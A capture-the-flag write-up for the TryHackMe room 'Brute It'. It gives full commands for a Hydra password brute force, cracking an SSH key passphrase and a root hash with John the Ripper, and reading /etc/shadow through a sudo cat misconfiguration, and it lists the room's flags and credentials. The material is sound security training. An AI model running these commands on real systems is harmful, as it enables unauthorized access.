# TryHackMe – Brute It

> **Room:** Brute It
> **Platform:** TryHackMe
> **Difficulty:** Easy
> **Focus:** Brute Force, Hash Cracking, Privilege Escalation

**Room Link:** [https://tryhackme.com/room/bruteit](https://tryhackme.com/room/bruteit)

---

## 1. Overview

**Brute It** is a beginner-friendly TryHackMe machine focused on three important penetration-testing concepts:

- **Brute Force**
- **Hash Cracking**
- **Privilege Escalation**

The attack starts with network enumeration using **Nmap**, followed by web enumeration to discover an `/admin` login panel.

After identifying the administrator username from the page source, I used **Hydra** to brute-force the password.

The admin panel exposed an encrypted **RSA private key**, which was converted into a crackable format using `ssh2john` and cracked with **John the Ripper**.

The recovered key allowed SSH access as the `john` user.

Finally, privilege enumeration revealed that `john` could execute `/bin/cat` with `sudo` privileges. This allowed access to `/etc/shadow`, where the root password hash was obtained and cracked.

### Attack Chain

```text
Nmap
  ↓
Web Enumeration
  ↓
/admin
  ↓
Source Code → username: admin
  ↓
Hydra
  ↓
admin:xavier
  ↓
Admin Panel
  ↓
Web Flag + RSA Private Key
  ↓
ssh2john
  ↓
John the Ripper
  ↓
RSA Passphrase: rockinroll
  ↓
SSH as john
  ↓
User Flag
  ↓
sudo -l
  ↓
/bin/cat with NOPASSWD
  ↓
/etc/shadow
  ↓
Crack root hash
  ↓
root:football
  ↓
Root Flag
```

---

# 2. Reconnaissance

## 2.1 Nmap Scan

I started by performing a basic Nmap scan to identify open ports and running services.

```bash
nmap -sC -sV <TARGET_IP>
```

The `-sC` option runs the default Nmap scripts, while `-sV` attempts to identify service versions.

The scan revealed services including:

```text
22/tcp   SSH
80/tcp   HTTP
```

The important services for the attack were:

- **SSH** → later used to access the `john` account.
- **HTTP** → used to discover the vulnerable admin panel.

---

# 3. Web Enumeration

Since HTTP was running on port 80, I opened:

```text
http://<TARGET_IP>
```

The website itself did not immediately expose anything useful, so I performed directory enumeration.

I used **Gobuster**:

```bash
gobuster dir -u http://<TARGET_IP> \
-w /usr/share/wordlists/dirb/common.txt
```

The scan discovered:

```text
/admin
```

This was the interesting directory because it appeared to contain an administrative login panel.

---

# 4. Admin Panel Enumeration

I accessed:

```text
http://<TARGET_IP>/admin/
```

A login page was presented with username and password fields.

Before brute-forcing the password, I inspected the page source.

```bash
curl http://<TARGET_IP>/admin/
```

or alternatively:

```text
Right Click → View Page Source
```

The source code revealed that the expected username was:

```text
admin
```

So instead of brute-forcing both username and password, I only needed to brute-force the password.

---

# 5. Brute-Forcing the Admin Password

## 5.1 Using Hydra

The login form accepted:

```text
user
pass
```

and returned the message:

```text
Username or password invalid
```

This gave us the information needed to configure Hydra.

```bash
hydra -l admin \
-P /usr/share/wordlists/rockyou.txt \
<TARGET_IP> \
http-post-form "/admin/:user=^USER^&pass=^PASS^:Username or password invalid"
```

Depending on the exact endpoint, the form may also be represented as:

```bash
hydra -l admin \
-P /usr/share/wordlists/rockyou.txt \
<TARGET_IP> \
http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:F=Username or password invalid"
```

Hydra eventually found the valid credentials:

```text
Username: admin
Password: xavier
```

### Credentials

```text
admin:xavier
```

---

# 6. Accessing the Admin Panel

I logged in using:

```text
admin:xavier
```

The admin panel contained two important pieces of information:

1. The **Web Flag**
2. A downloadable **RSA Private Key** belonging to `john`

The web flag was:

```text
THM{brut3_f0rce_is_e4sy}
```

### Web Flag

```text
THM{brut3_f0rce_is_e4sy}
```

The RSA key was the next objective because it could potentially allow SSH authentication as `john`.

---

# 7. Downloading John's RSA Private Key

I downloaded the RSA private key and saved it locally as:

```text
id_rsa
```

However, the key was encrypted with a passphrase.

Trying to use it directly with SSH would therefore fail without knowing the passphrase.

We need to crack the passphrase.

---

# 8. Converting the RSA Key for John the Ripper

`John the Ripper` cannot directly crack the private key file.

Therefore, I used:

```bash
ssh2john id_rsa > id_rsa.hash
```

This extracts the relevant encrypted information from the RSA key and converts it into a format that John can process.

Now we have:

```text
id_rsa.hash
```

---

# 9. Cracking the RSA Passphrase

I used John the Ripper with the `rockyou.txt` wordlist:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```

To display the recovered password:

```bash
john --show id_rsa.hash
```

The recovered passphrase was:

```text
rockinroll
```

### RSA Passphrase

```text
rockinroll
```

---

# 10. Preparing the SSH Private Key

SSH requires restrictive permissions on private key files.

I changed the permissions:

```bash
chmod 600 id_rsa
```

Now the key can be used for SSH authentication.

---

# 11. SSH Access as John

The machine has SSH running on port 22.

I connected using:

```bash
ssh -i id_rsa john@<TARGET_IP>
```

When prompted for the passphrase, I entered:

```text
rockinroll
```

This successfully authenticated as:

```text
john
```

---

# 12. Obtaining the User Flag

After obtaining the SSH shell, I searched for the user flag.

A common location is:

```bash
cat /home/john/user.txt
```

The user flag is:

```text
THM{a_password_is_not_a_barrier}
```

### User Flag

```text
THM{a_password_is_not_a_barrier}
```

---

# 13. Privilege Escalation Enumeration

Now that we have a shell as `john`, the next objective is to escalate privileges to root.

The first thing I checked was which commands the current user could execute using `sudo`.

```bash
sudo -l
```

The output showed that `john` could execute:

```text
/bin/cat
```

as root without entering a password.

Conceptually:

```text
(root) NOPASSWD: /bin/cat
```

This is a serious privilege escalation vulnerability because `cat` can read arbitrary files.

---

# 14. Reading /etc/shadow

The `/etc/shadow` file contains password hashes for local users.

Since we can execute `cat` as root, we can read it with:

```bash
sudo /bin/cat /etc/shadow
```

The output contains entries similar to:

```text
root:$6$........:...
```

The `$6$` prefix indicates that the password is stored using **SHA-512 crypt**.

I copied the root hash to my attacking machine for cracking.

---

# 15. Cracking the Root Password

I saved the root hash into a file:

```bash
nano root.hash
```

Then I used John the Ripper:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt root.hash
```

To display the cracked password:

```bash
john --show root.hash
```

The recovered root password was:

```text
football
```

### Root Password

```text
football
```

---

# 16. Obtaining Root Access

Now that the root password has been recovered, I can switch to the root account:

```bash
su root
```

Enter:

```text
football
```

The shell changes to:

```text
root@<TARGET>:#
```

We now have root privileges.

---

# 17. Obtaining the Root Flag

The root flag is located at:

```text
/root/root.txt
```

It can be retrieved directly using the previously identified sudo permission:

```bash
sudo /bin/cat /root/root.txt
```

The root flag is:

```text
THM{pr1v1l3g3_3sc4l4t10n}
```

### Root Flag

```text
THM{pr1v1l3g3_3sc4l4t10n}
```

---

# 18. Complete Solution

The complete attack can be summarized as:

### Step 1 — Scan

```bash
nmap -sC -sV <TARGET_IP>
```

Discover:

```text
22 → SSH
80 → HTTP
```

### Step 2 — Directory Enumeration

```bash
gobuster dir -u http://<TARGET_IP> \
-w /usr/share/wordlists/dirb/common.txt
```

Discover:

```text
/admin
```

### Step 3 — Source Code Analysis

The admin login page reveals:

```text
Username: admin
```

### Step 4 — Brute Force

```bash
hydra -l admin \
-P /usr/share/wordlists/rockyou.txt \
<TARGET_IP> \
http-post-form "/admin/:user=^USER^&pass=^PASS^:Username or password invalid"
```

Credentials:

```text
admin:xavier
```

### Step 5 — Admin Panel

Login with:

```text
admin:xavier
```

Obtain:

```text
Web Flag
RSA Private Key
```

Web flag:

```text
THM{brut3_f0rce_is_e4sy}
```

### Step 6 — Crack RSA Key

```bash
ssh2john id_rsa > id_rsa.hash
```

Then:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```

Passphrase:

```text
rockinroll
```

### Step 7 — SSH

```bash
chmod 600 id_rsa
ssh -i id_rsa john@<TARGET_IP>
```

User:

```text
john
```

User flag:

```text
THM{a_password_is_not_a_barrier}
```

### Step 8 — Sudo Enumeration

```bash
sudo -l
```

Discover:

```text
/bin/cat
```

can be executed as root without a password.

### Step 9 — Read Shadow

```bash
sudo /bin/cat /etc/shadow
```

Extract the root password hash.

### Step 10 — Crack Root Password

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt root.hash
```

Password:

```text
football
```

### Step 11 — Root

```bash
su root
```

or directly:

```bash
sudo /bin/cat /root/root.txt
```

Root flag:

```text
THM{pr1v1l3g3_3sc4l4t10n}
```

---

# 19. Vulnerabilities Identified

## 1. Weak Admin Password

The admin account used a weak password that was present in a common password wordlist.

```text
admin:xavier
```

A strong password policy and brute-force protection could mitigate this.

---

## 2. Username Disclosure

The admin username was exposed through the page source.

This reduced the brute-force problem from:

```text
username + password
```

to:

```text
password only
```

---

## 3. No Brute-Force Protection

The login form did not effectively prevent repeated authentication attempts.

This allowed Hydra to perform a password attack.

Possible mitigations:

- Rate limiting
- Account lockout
- CAPTCHA
- MFA
- Strong password policies
- Monitoring failed authentication attempts

---

## 4. Sensitive RSA Key Exposure

The admin panel exposed John's private RSA key.

Private SSH keys should never be publicly accessible through an administrative web panel.

---

## 5. Weak RSA Passphrase

The private key was protected using a weak passphrase:

```text
rockinroll
```

A stronger passphrase would make offline cracking significantly harder.

---

## 6. Dangerous Sudo Permission

The most critical privilege escalation issue was:

```text
john → sudo /bin/cat
```

Allowing a low-privileged user to execute `cat` as root effectively allows arbitrary sensitive files to be read.

This exposed:

```text
/etc/shadow
```

and ultimately enabled recovery of the root password.

---

# 20. Lessons Learned

This room demonstrates how multiple small security weaknesses can be chained together into complete system compromise.

The important lessons are:

- Always perform proper **service enumeration**.
- Hidden directories can expose sensitive functionality.
- Inspect web application **source code** for information disclosure.
- Weak authentication controls enable **brute-force attacks**.
- Private SSH keys must be protected properly.
- Encrypted private keys should use strong passphrases.
- Always perform `sudo -l` during Linux privilege escalation.
- Dangerous binaries in `sudoers` can lead to sensitive file disclosure.
- Password hashes should be protected and use strong password policies.
- A single weak configuration can become critical when combined with other vulnerabilities.

---

# 21. Flags & Credentials

| Item           | Value                              |
| -------------- | ---------------------------------- |
| Admin Username | `admin`                            |
| Admin Password | `xavier`                           |
| RSA Passphrase | `rockinroll`                       |
| Root Password  | `football`                         |
| Web Flag       | `THM{brut3_f0rce_is_e4sy}`         |
| User Flag      | `THM{a_password_is_not_a_barrier}` |
| Root Flag      | `THM{pr1v1l3g3_3sc4l4t10n}`        |

---

# 22. Final Attack Path

```text
Nmap
    ↓
Port 80
    ↓
Gobuster
    ↓
/admin
    ↓
Source Code
    ↓
admin
    ↓
Hydra
    ↓
admin:xavier
    ↓
Admin Panel
    ↓
Web Flag + RSA Private Key
    ↓
ssh2john
    ↓
John the Ripper
    ↓
rockinroll
    ↓
SSH
    ↓
john
    ↓
User Flag
    ↓
sudo -l
    ↓
/bin/cat
    ↓
/etc/shadow
    ↓
John the Ripper
    ↓
football
    ↓
root
    ↓
Root Flag
```

---

# Conclusion

**Brute It** demonstrates a realistic attack chain where several weaknesses are combined to compromise a Linux machine.

The initial **web enumeration** exposed the admin panel, the lack of **brute-force protection** allowed credential discovery, the admin panel exposed an encrypted **RSA private key**, and weak password protection allowed the key's passphrase to be cracked.

After gaining SSH access, insecure **sudo configuration** allowed access to `/etc/shadow`, leading to recovery of the root password and complete system compromise.

The most important takeaway is that security failures rarely exist in isolation. Multiple individually simple weaknesses can be chained together to achieve full **privilege escalation**.

---

## Disclaimer
This writeup is intended for educational purposes and authorized security testing environments such as TryHackMe. Do not use these techniques against systems without explicit permission.


This writeup is intended for educational purposes and authorized security testing environments such as TryHackMe. Do not use these techniques against systems without explicit permission.
